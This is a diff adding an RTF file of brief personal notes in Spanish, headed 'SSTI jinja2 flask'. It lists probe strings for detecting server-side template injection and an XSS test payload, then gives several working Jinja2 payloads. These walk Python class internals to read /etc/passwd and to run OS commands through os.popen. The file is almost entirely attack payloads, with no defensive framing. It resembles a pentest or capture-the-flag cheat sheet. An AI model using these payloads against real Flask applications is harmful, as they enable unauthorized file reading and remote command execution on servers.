@@ -1,0 +1,70 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2580
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fmodern\fcharset0 Courier-Bold;\f1\fmodern\fcharset0 Courier;}
+{\colortbl;\red255\green255\blue255;\red252\green41\blue19;\red255\green255\blue255;\red0\green0\blue0;
+\red255\green255\blue255;\red0\green0\blue0;\red255\green255\blue255;\red0\green0\blue0;\red156\green156\blue153;
+\red156\green156\blue153;\red230\green230\blue227;\red220\green209\blue91;\red244\green0\blue92;\red164\green109\blue255;
+\red0\green0\blue0;\red139\green255\blue82;}
+{\*\expandedcolortbl;;\cssrgb\c100000\c25745\c7993;\cssrgb\c100000\c100000\c99971;\cssrgb\c0\c1\c1;
+\cssrgb\c100000\c100000\c99985;\cssrgb\c0\c1\c1;\cssrgb\c100000\c100000\c100000;\cssrgb\c0\c1\c1;\cssrgb\c67315\c67312\c66559;
+\cssrgb\c67315\c67312\c66559;\cssrgb\c92261\c92257\c91225;\cssrgb\c88979\c84338\c42937;\cssrgb\c97760\c14630\c43666;\cssrgb\c70670\c53243\c100000;
+\cssrgb\c0\c0\c0;\cssrgb\c59722\c99690\c39440\c60000;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww28600\viewh14960\viewkind0
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\qc\partightenfactor0
+
+\f0\b\fs48 \cf2 \cb3 \ul \ulc2 SSTI jinja2 flask
+\f1\b0\fs24 \cf4 \cb5 \ulnone \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf4 \cb5 \
+
+\fs28 \cf6 \cb7 \
+\pard\pardeftab720\partightenfactor0
+\cf8 \expnd0\expndtw0\kerning0
+<img src=x onerror="alert('xss')">\cf6 \kerning1\expnd0\expndtw0 \
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf6 \
+\
+Pruebas para determinar tipo de ataque SSTI:\
+\
+\{\{7*7\}\}\
+$\{7*7\}\
+<%= 7*7 %>\
+$\{\{7*7\}\}\
+#\{7*7\}\
+\pard\pardeftab720\partightenfactor0
+\cf6 \expnd0\expndtw0\kerning0
+\outl0\strokewidth0 \strokec10 \
+\
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+\cf6 \kerning1\expnd0\expndtw0 \outl0\strokewidth0 {{\NeXTGraphic Captura de pantalla 2022-05-25 a las 10.06.35.png \width14300 \height8200 \appleattachmentpadding0 \appleembedtype0 \appleaqc
+}¬}\
+\cf6 \expnd0\expndtw0\kerning0
+\outl0\strokewidth0 \strokec10 \
+\pard\pardeftab720\partightenfactor0
+\cf6 \strokec10 \
+\pard\pardeftab720\partightenfactor0
+\cf6 \strokec11 \{\{\cf6 \strokec12 ""\cf6 \strokec13 .\cf6 \strokec11 __class__\cf6 \strokec13 .\cf6 \strokec11 __mro__[\cf6 \strokec14 1\cf6 \strokec11 ]\cf6 \strokec13 .\cf6 \strokec11 __subclasses__() \}\}\
+\
+\
+\pard\pardeftab720\partightenfactor0
+\cf6 \strokec15 \{\{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() \}\}\
+\
+\
+\{\{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() \}\}\
+\cf8 \cb5 \
+\
+\pard\pardeftab720\partightenfactor0
+
+\fs30 \cf6 \cb7 \strokec16 \{\{ get_flashed_messages.globals.builtins.open("/etc/passwd").read() \}\}
+\fs28 \cf6 \strokec15 \
+\pard\pardeftab720\partightenfactor0
+\cf6 \strokec11 \
+\pard\pardeftab720\partightenfactor0
+\cf6 \strokec11 \
+\{\{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls *").read()\}\}\
+\
+\pard\tx566\pardeftab720\partightenfactor0
+\cf6 \
+\pard\pardeftab720\partightenfactor0
+\cf6 \
+\
+}
